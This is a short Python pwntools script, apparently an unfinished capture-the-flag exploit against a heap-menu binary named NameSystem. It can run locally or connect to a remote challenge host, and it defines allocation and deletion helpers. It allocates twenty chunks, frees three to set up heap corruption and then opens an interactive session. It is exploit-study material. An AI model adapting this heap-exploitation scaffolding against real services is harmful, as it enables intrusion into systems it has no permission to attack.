from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./NameSystem')
else:
	p = remote('183.129.189.62', 14005)

def add(size, name):
	p.recvuntil('choice :')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Name:')
	p.send(name)

def free(idx):
	p.recvuntil('choice :')
	p.sendline('3')
	p.recvuntil('delete:')
	p.sendline(str(idx))

for i in range(20):
	add(32, 'kotori\n')
free(0)
free(19)
free(18)

p.interactive()
